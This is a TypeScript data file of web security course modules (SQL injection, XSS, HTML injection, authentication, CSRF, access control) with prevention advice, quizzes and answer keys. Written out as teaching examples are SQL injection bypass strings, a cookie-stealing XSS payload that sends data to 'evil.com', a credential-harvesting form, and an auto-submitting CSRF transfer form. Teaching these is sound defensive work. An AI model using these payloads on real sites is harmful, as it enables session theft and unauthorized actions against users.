export interface ModuleContent {
  title: string;
  level: string;
  duration: string;
  sections: {
    heading: string;
    content: string[];
    examples?: string[];
    tips?: string[];
  }[];
  quiz?: {
    question: string;
    options: string[];
    correctAnswer: number;
  }[];
  labLink?: string;
}

export const moduleContentData: Record<string, ModuleContent> = {
  'intro-web-security': {
    title: 'Introduction to Web Security',
    level: 'beginner',
    duration: '30 mins',
    sections: [
      {
        heading: 'What is Web Security?',
        content: [
          'Web security refers to the protective measures and protocols that organizations adopt to protect their web applications from cyber threats and vulnerabilities.',
          'As our world becomes increasingly digital, web applications have become prime targets for attackers seeking to steal data, disrupt services, or gain unauthorized access to systems.',
          'Understanding web security is crucial for anyone involved in building, maintaining, or using web applications.'
        ]
      },
      {
        heading: 'Common Web Vulnerabilities',
        content: [
          'The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.',
          'Key vulnerabilities include:',
          '• Injection attacks (SQL, XSS, HTML)',
          '• Broken authentication',
          '• Sensitive data exposure',
          '• Security misconfiguration',
          '• Cross-Site Request Forgery (CSRF)'
        ]
      },
      {
        heading: 'Security Principles',
        content: [
          'Principle of Least Privilege: Users should only have access to resources they absolutely need.',
          'Defense in Depth: Multiple layers of security controls throughout an IT system.',
          'Input Validation: Never trust user input - always validate and sanitize.',
          'Security by Design: Build security into applications from the start, not as an afterthought.'
        ],
        tips: [
          'Always assume attackers will find vulnerabilities',
          'Keep all software and dependencies up to date',
          'Use HTTPS for all connections',
          'Implement proper logging and monitoring'
        ]
      },
      {
        heading: 'The CIA Triad',
        content: [
          'Confidentiality: Ensuring that information is not disclosed to unauthorized individuals or systems.',
          'Integrity: Maintaining the consistency, accuracy, and trustworthiness of data.',
          'Availability: Ensuring that information and resources are accessible to authorized users when needed.'
        ]
      }
    ],
    quiz: [
      {
        question: 'What does the "I" in CIA Triad stand for?',
        options: ['Information', 'Integrity', 'Intrusion', 'Investigation'],
        correctAnswer: 1
      },
      {
        question: 'Which principle states users should only have minimal necessary access?',
        options: ['Defense in Depth', 'Least Privilege', 'Security by Design', 'Input Validation'],
        correctAnswer: 1
      }
    ]
  },
  'sql-injection-basics': {
    title: 'SQL Injection Basics',
    level: 'beginner',
    duration: '45 mins',
    sections: [
      {
        heading: 'What is SQL Injection?',
        content: [
          'SQL Injection is a code injection technique that exploits a security vulnerability in an application\'s database layer.',
          'Attackers can insert malicious SQL statements into entry fields for execution, potentially accessing, modifying, or deleting data.',
          'It occurs when user input is incorrectly filtered or directly concatenated into SQL queries.'
        ],
        examples: [
          'Vulnerable query: SELECT * FROM users WHERE username = \'' + userInput + '\'',
          'Attack input: admin\' OR \'1\'=\'1',
          'Resulting query: SELECT * FROM users WHERE username = \'admin\' OR \'1\'=\'1\''
        ]
      },
      {
        heading: 'Types of SQL Injection',
        content: [
          'In-band SQLi: Attacker uses the same channel to launch attacks and gather results.',
          '• Error-based SQLi: Forces the database to generate errors revealing information',
          '• Union-based SQLi: Uses UNION operator to combine results of multiple SELECT statements',
          '',
          'Inferential SQLi (Blind): No data transfer, attacker reconstructs database structure.',
          '• Boolean-based: Sends queries forcing true/false responses',
          '• Time-based: Forces database to wait before responding',
          '',
          'Out-of-band SQLi: Uses different channels to launch attacks and gather results.'
        ]
      },
      {
        heading: 'Common Attack Patterns',
        content: [
          'Authentication Bypass: \' OR \'1\'=\'1\' -- ',
          'This makes the query always return true, bypassing login.',
          '',
          'UNION Attack: \' UNION SELECT username, password FROM users -- ',
          'Retrieves data from other tables.',
          '',
          'Comment Injection: admin\'--',
          'Comments out the rest of the query, potentially bypassing password checks.'
        ],
        examples: [
          'Normal: SELECT * FROM products WHERE name = \'laptop\'',
          'Injected: SELECT * FROM products WHERE name = \'laptop\' OR \'1\'=\'1\'',
          'Effect: Returns all products instead of just laptops'
        ]
      },
      {
        heading: 'Prevention Techniques',
        content: [
          'Prepared Statements (Parameterized Queries): Separate SQL code from data.',
          'Stored Procedures: Use pre-defined SQL code with parameters.',
          'Input Validation: Whitelist allowed characters and patterns.',
          'Escaping User Input: Escape special characters in user input.',
          'Least Privilege: Database accounts should have minimal permissions.',
          'Web Application Firewalls: Can detect and block SQL injection attempts.'
        ],
        tips: [
          'Never concatenate user input directly into SQL queries',
          'Use ORM frameworks when possible',
          'Implement proper error handling without exposing database details',
          'Regular security audits and penetration testing'
        ]
      }
    ],
    quiz: [
      {
        question: 'What is the primary cause of SQL Injection vulnerabilities?',
        options: [
          'Weak passwords',
          'Unvalidated user input in SQL queries',
          'Missing HTTPS',
          'Old database versions'
        ],
        correctAnswer: 1
      },
      {
        question: 'Which of these is the best defense against SQL Injection?',
        options: [
          'Input validation only',
          'Prepared statements with parameterized queries',
          'Hiding error messages',
          'Using complex passwords'
        ],
        correctAnswer: 1
      }
    ],
    labLink: 'sql-injection'
  },
  'xss-basics': {
    title: 'Cross-Site Scripting (XSS)',
    level: 'beginner',
    duration: '40 mins',
    sections: [
      {
        heading: 'Understanding XSS',
        content: [
          'Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.',
          'When victims load the compromised page, the malicious script executes in their browser, potentially stealing cookies, session tokens, or other sensitive information.',
          'XSS exploits the trust a user has for a particular website.'
        ]
      },
      {
        heading: 'Types of XSS',
        content: [
          'Reflected XSS: Malicious script comes from the current HTTP request.',
          '• Attack is delivered via URL or form submission',
          '• Victim clicks malicious link',
          '• Script reflects off web server and executes in victim\'s browser',
          '',
          'Stored XSS: Malicious script is permanently stored on target server.',
          '• Attack stored in database, comment field, forum post, etc.',
          '• More dangerous as it affects multiple users',
          '• No user interaction beyond visiting page',
          '',
          'DOM-based XSS: Vulnerability exists in client-side code.',
          '• Payload executed by modifying DOM environment',
          '• Server-side code not involved'
        ]
      },
      {
        heading: 'Common Attack Vectors',
        content: [
          'Basic script injection: <script>alert(\'XSS\')</script>',
          'Image tag with error handler: <img src=x onerror="alert(\'XSS\')">',
          'Event handlers: <div onmouseover="alert(\'XSS\')">Hover me</div>',
          'JavaScript URLs: <a href="javascript:alert(\'XSS\')">Click</a>',
          'Cookie stealing: <script>fetch(\'evil.com?c=\'+document.cookie)</script>'
        ],
        examples: [
          'Search functionality: example.com/search?q=<script>alert(1)</script>',
          'Comment section: Stored <img> tag with malicious onerror',
          'Profile fields: Bio field with <script> tag'
        ]
      },
      {
        heading: 'Impact of XSS',
        content: [
          'Session Hijacking: Steal authentication cookies and impersonate users.',
          'Credential Theft: Create fake login forms to capture credentials.',
          'Website Defacement: Modify page content visible to users.',
          'Malware Distribution: Redirect users to malicious sites.',
          'Keylogging: Capture user keystrokes on the page.',
          'Phishing: Display fake content to trick users.'
        ]
      },
      {
        heading: 'Prevention Strategies',
        content: [
          'Input Validation: Validate all user input against whitelist.',
          'Output Encoding: Encode data before rendering in HTML.',
          'Content Security Policy (CSP): Restrict sources of executable scripts.',
          'HTTPOnly Cookies: Prevent JavaScript access to cookies.',
          'X-XSS-Protection Header: Enable browser XSS filters.',
          'Use Security Libraries: Leverage framework built-in protections.'
        ],
        tips: [
          'Never insert untrusted data directly into HTML',
          'Use frameworks that auto-escape XSS by design',
          'Implement CSP headers on all pages',
          'Regular security testing and code reviews'
        ]
      }
    ],
    quiz: [
      {
        question: 'Which type of XSS is stored on the server?',
        options: ['Reflected XSS', 'Stored XSS', 'DOM-based XSS', 'None'],
        correctAnswer: 1
      },
      {
        question: 'What is the best way to prevent XSS?',
        options: [
          'Block all user input',
          'Input validation and output encoding',
          'Use only GET requests',
          'Disable JavaScript'
        ],
        correctAnswer: 1
      }
    ],
    labLink: 'xss'
  },
  'html-injection': {
    title: 'HTML Injection',
    level: 'beginner',
    duration: '35 mins',
    sections: [
      {
        heading: 'What is HTML Injection?',
        content: [
          'HTML Injection is a vulnerability that allows attackers to inject arbitrary HTML code into vulnerable web pages.',
          'Similar to XSS but focuses on injecting HTML markup rather than JavaScript.',
          'Can be used for phishing, defacement, or as a stepping stone to XSS attacks.',
          'Occurs when user input is not properly sanitized before being rendered in HTML.'
        ]
      },
      {
        heading: 'HTML vs XSS Injection',
        content: [
          'HTML Injection: Injects HTML markup to change page structure and appearance.',
          '• Cannot execute JavaScript directly',
          '• Used for phishing and social engineering',
          '• Can create fake forms or content',
          '',
          'XSS: Injects executable JavaScript code.',
          '• Can execute arbitrary JavaScript',
          '• Steals data and performs actions',
          '• More dangerous than pure HTML injection',
          '',
          'Note: HTML Injection can often escalate to XSS if not properly mitigated.'
        ]
      },
      {
        heading: 'Attack Examples',
        content: [
          'Fake Login Form: Inject HTML form that sends credentials to attacker.',
          '<form action="http://evil.com/steal" method="POST">',
          '',
          'Phishing Content: Inject fake messages or warnings.',
          '<div style="color:red">Your account has been compromised! Enter password to verify:</div>',
          '',
          'Defacement: Change visual appearance of the page.',
          '<h1>This site has been hacked!</h1>',
          '',
          'Link Injection: Insert malicious links.',
          '<a href="http://malicious.com">Click here for free prize</a>'
        ],
        examples: [
          'Comment field: <b>Bold text</b> becomes actual bold HTML',
          'Profile bio: <iframe src="http://evil.com"> embeds external content',
          'Forum post: <img src="http://evil.com/track.gif"> tracks users'
        ]
      },
      {
        heading: 'Attack Scenarios',
        content: [
          'Credential Harvesting: Create fake login forms that look legitimate.',
          'SEO Poisoning: Inject hidden links to boost search rankings.',
          'Content Manipulation: Change prices, offers, or information.',
          'Social Engineering: Display fake security warnings or messages.',
          'Clickjacking Setup: Create invisible elements to trick clicks.'
        ]
      },
      {
        heading: 'Prevention Methods',
        content: [
          'Input Sanitization: Remove or escape HTML special characters.',
          'Whitelist Approach: Only allow specific safe HTML tags if needed.',
          'Output Encoding: Encode HTML entities before display.',
          'Content Security Policy: Restrict inline HTML and external resources.',
          'Framework Protection: Use template engines with auto-escaping.',
          'Regular Expression Validation: Validate input format strictly.'
        ],
        tips: [
          'Treat all user input as untrusted',
          'Use HTML entity encoding for special characters',
          'Implement both client and server-side validation',
          'Regular security audits of input fields'
        ]
      }
    ],
    quiz: [
      {
        question: 'What is the main difference between HTML Injection and XSS?',
        options: [
          'HTML Injection only affects images',
          'HTML Injection focuses on markup, XSS executes scripts',
          'They are the same thing',
          'XSS is less dangerous'
        ],
        correctAnswer: 1
      },
      {
        question: 'Which technique prevents HTML Injection?',
        options: [
          'Using HTTPS',
          'Strong passwords',
          'HTML entity encoding',
          'Database encryption'
        ],
        correctAnswer: 2
      }
    ],
    labLink: 'html-injection'
  },
  'basic-authentication': {
    title: 'Authentication Security',
    level: 'beginner',
    duration: '35 mins',
    sections: [
      {
        heading: 'Authentication Basics',
        content: [
          'Authentication is the process of verifying the identity of a user, device, or system.',
          'It answers the question: "Who are you?"',
          'Strong authentication is the foundation of application security.',
          'Weak authentication can lead to unauthorized access and data breaches.'
        ]
      },
      {
        heading: 'Common Authentication Methods',
        content: [
          'Password-based: User provides username and password.',
          '• Most common but also most vulnerable',
          '• Strength depends on password complexity',
          '',
          'Multi-Factor Authentication (MFA): Combines multiple authentication methods.',
          '• Something you know (password)',
          '• Something you have (phone, token)',
          '• Something you are (biometrics)',
          '',
          'Token-based: Uses cryptographic tokens.',
          '• JWT, OAuth tokens',
          '• Session tokens',
          '',
          'Biometric: Uses physical characteristics.',
          '• Fingerprint, face recognition',
          '• Iris scan, voice recognition'
        ]
      },
      {
        heading: 'Common Vulnerabilities',
        content: [
          'SQL Injection in Login: Bypassing authentication with SQL injection.',
          'Example: username: admin\'-- password: anything',
          '',
          'Weak Password Policies: Allowing simple passwords.',
          '• No complexity requirements',
          '• No length requirements',
          '• Allowing common passwords',
          '',
          'Broken Session Management: Poor session handling.',
          '• Predictable session IDs',
          '• Sessions never expire',
          '• Session fixation vulnerabilities',
          '',
          'Default Credentials: Using default usernames/passwords.',
          '• admin/admin, root/root',
          '• Never change default credentials'
        ]
      },
      {
        heading: 'Attack Techniques',
        content: [
          'Brute Force: Trying many password combinations.',
          'Dictionary Attack: Using common password lists.',
          'Credential Stuffing: Using leaked credentials from other breaches.',
          'Password Spraying: Trying common passwords against many accounts.',
          'Session Hijacking: Stealing valid session tokens.',
          'Man-in-the-Middle: Intercepting authentication credentials.'
        ],
        examples: [
          'Brute force: Automated tool tries 1000s of passwords',
          'SQL injection: admin\'-- bypasses password check',
          'Session hijacking: Stealing cookie with session ID'
        ]
      },
      {
        heading: 'Security Best Practices',
        content: [
          'Strong Password Policy: Enforce complexity and length requirements.',
          'Account Lockout: Lock account after failed login attempts.',
          'Multi-Factor Authentication: Add additional verification layer.',
          'Secure Password Storage: Hash passwords with bcrypt or Argon2.',
          'HTTPS Only: Encrypt credentials in transit.',
          'Rate Limiting: Prevent brute force attacks.',
          'Session Security: Secure session management practices.',
          'Regular Security Audits: Test authentication mechanisms regularly.'
        ],
        tips: [
          'Never store passwords in plain text',
          'Use salt with password hashing',
          'Implement account lockout after 5 failed attempts',
          'Force password changes after breach detection',
          'Use secure random session ID generation'
        ]
      }
    ],
    quiz: [
      {
        question: 'What does MFA stand for?',
        options: [
          'Multiple File Access',
          'Multi-Factor Authentication',
          'Master File Authentication',
          'Main Form Access'
        ],
        correctAnswer: 1
      },
      {
        question: 'Which is the most secure password hashing algorithm?',
        options: ['MD5', 'SHA-1', 'bcrypt or Argon2', 'Base64'],
        correctAnswer: 2
      }
    ],
    labLink: 'auth-bypass'
  },
  'csrf-attacks': {
    title: 'CSRF Attacks',
    level: 'intermediate',
    duration: '45 mins',
    sections: [
      {
        heading: 'Understanding CSRF',
        content: [
          'Cross-Site Request Forgery (CSRF) tricks users into executing unwanted actions on web applications where they are authenticated.',
          'Exploits the trust a web application has in the user\'s browser.',
          'Attacker crafts malicious requests that appear to come from the victim.',
          'Can lead to unauthorized fund transfers, data changes, or account takeovers.'
        ]
      },
      {
        heading: 'How CSRF Works',
        content: [
          'Step 1: Victim logs into legitimate website (bank.com)',
          'Step 2: Website creates session and sends authentication cookie',
          'Step 3: Victim visits malicious website without logging out',
          'Step 4: Malicious site contains hidden request to bank.com',
          'Step 5: Browser automatically includes authentication cookie',
          'Step 6: Legitimate site processes request thinking it\'s from victim',
          '',
          'Key Point: The victim\'s browser automatically sends cookies with every request, even if initiated from another site.'
        ]
      },
      {
        heading: 'Attack Examples',
        content: [
          'Simple GET-based CSRF:',
          '<img src="http://bank.com/transfer?to=attacker&amount=1000">',
          '',
          'POST-based CSRF with auto-submit form:',
          '<form action="http://bank.com/transfer" method="POST">',
          '  <input name="to" value="attacker">',
          '  <input name="amount" value="1000">',
          '</form>',
          '<script>document.forms[0].submit()</script>',
          '',
          'Hidden in social media:',
          'Malicious link shared on social media that performs action when clicked.'
        ],
        examples: [
          'Email change: Force user to change their email to attacker\'s',
          'Password change: Change user password without their knowledge',
          'Purchase items: Make unauthorized purchases',
          'Follow accounts: Force user to follow attacker\'s social media'
        ]
      },
      {
        heading: 'CSRF vs XSS',
        content: [
          'CSRF: Exploits trust website has in user\'s browser.',
          '• Attacker cannot read response',
          '• Requires user to be authenticated',
          '• Attacks state-changing actions',
          '',
          'XSS: Exploits trust user has in website.',
          '• Attacker can read responses',
          '• Can work without authentication',
          '• Can perform any action user can',
          '',
          'Note: XSS can be used to bypass CSRF protections.'
        ]
      },
      {
        heading: 'Defense Mechanisms',
        content: [
          'CSRF Tokens: Random unique token for each request.',
          '• Server generates token per session',
          '• Token included in forms',
          '• Server validates token before processing',
          '',
          'SameSite Cookies: Browser won\'t send cookie in cross-site requests.',
          '• SameSite=Strict: Never sent cross-site',
          '• SameSite=Lax: Sent on safe methods (GET)',
          '',
          'Origin/Referer Headers: Validate request source.',
          '• Check Origin header matches target',
          '• Verify Referer header',
          '',
          'Double Submit Cookie: Compare cookie value with request parameter.',
          'Custom Headers: Require custom header that cannot be set cross-origin.',
          'Re-authentication: Require password for sensitive actions.'
        ],
        tips: [
          'Use CSRF tokens for all state-changing operations',
          'Set SameSite attribute on all cookies',
          'Never use GET requests for state changes',
          'Implement multiple layers of defense'
        ]
      }
    ],
    quiz: [
      {
        question: 'What does CSRF exploit?',
        options: [
          'Trust user has in website',
          'Trust website has in user\'s browser',
          'Weak passwords',
          'SQL injection'
        ],
        correctAnswer: 1
      },
      {
        question: 'Best defense against CSRF?',
        options: [
          'Strong passwords',
          'HTTPS only',
          'CSRF tokens and SameSite cookies',
          'Input validation'
        ],
        correctAnswer: 2
      }
    ],
    labLink: 'csrf'
  },
  'broken-access-control': {
    title: 'Broken Access Control',
    level: 'intermediate',
    duration: '50 mins',
    sections: [
      {
        heading: 'What is Access Control?',
        content: [
          'Access Control determines what users can and cannot do within an application.',
          'It enforces policy such that users cannot act outside of their intended permissions.',
          'Failures typically lead to unauthorized information disclosure, modification, or destruction.',
          'One of the most critical web application security risks.'
        ]
      },
      {
        heading: 'Types of Access Control',
        content: [
          'Vertical Access Control: Restricts access to sensitive functionality.',
          '• Admin vs regular user functions',
          '• Different privilege levels',
          '',
          'Horizontal Access Control: Restricts access to resources to specific users.',
          '• User A cannot access User B\'s data',
          '• Same privilege level, different resources',
          '',
          'Context-dependent Access Control: Restricts access based on application state.',
          '• Workflow-based restrictions',
          '• Status-dependent access'
        ]
      },
      {
        heading: 'Common Vulnerabilities',
        content: [
          'Insecure Direct Object Reference (IDOR): Access objects by modifying parameters.',
          'Example: /user/profile?id=123 → /user/profile?id=124',
          '',
          'Missing Function Level Access Control: Accessing admin functions as regular user.',
          'Example: Regular user accesses /admin/deleteUser',
          '',
          'Privilege Escalation: Gaining higher privileges than intended.',
          '• Horizontal: Access other users\' data',
          '• Vertical: Gain admin access',
          '',
          'URL Manipulation: Changing URLs to access unauthorized resources.',
          'Forced Browsing: Guessing or forcing access to hidden pages.',
          'Parameter Tampering: Modifying parameters to bypass controls.'
        ]
      },
      {
        heading: 'Attack Scenarios',
        content: [
          'Scenario 1: Accessing Other Users\' Data',
          'User views their orders at /orders?userId=123',
          'Changes URL to /orders?userId=124',
          'Views another user\'s orders',
          '',
          'Scenario 2: Privilege Escalation',
          'Regular user discovers admin panel at /admin',
          'Application doesn\'t check authorization',
          'User gains admin access',
          '',
          'Scenario 3: API Abuse',
          'Mobile app calls API: /api/user/123/profile',
          'Attacker calls /api/user/124/profile',
          'Accesses other users\' data through API'
        ],
        examples: [
          'Bank account: Change account number in request',
          'Shopping cart: Modify prices in POST data',
          'File download: Change file ID to access others\' files',
          'Admin panel: Access /admin without proper role'
        ]
      },
      {
        heading: 'Prevention Strategies',
        content: [
          'Deny by Default: Require explicit grant for every resource.',
          'Principle of Least Privilege: Minimum necessary access only.',
          'Server-side Enforcement: Never rely on client-side checks.',
          'Access Control Matrix: Define clear roles and permissions.',
          'Indirect Reference Maps: Use random identifiers, not sequential IDs.',
          'Logging and Monitoring: Log all access control failures.',
          'Regular Testing: Test with different user roles.',
          'Framework Security: Use framework built-in access control.'
        ],
        tips: [
          'Always verify user authorization server-side',
          'Use UUIDs instead of sequential IDs',
          'Implement role-based access control (RBAC)',
          'Test with different user accounts',
          'Never expose internal IDs to users'
        ]
      }
    ],
    quiz: [
      {
        question: 'What is IDOR?',
        options: [
          'Internet Data Object Reference',
          'Insecure Direct Object Reference',
          'Internal Database Object Record',
          'Invalid Data Object Response'
        ],
        correctAnswer: 1
      },
      {
        question: 'What type of escalation allows accessing other users\' data?',
        options: [
          'Vertical privilege escalation',
          'Horizontal privilege escalation',
          'Diagonal privilege escalation',
          'No escalation'
        ],
        correctAnswer: 1
      }
    ],
    labLink: 'broken-access'
  }
};
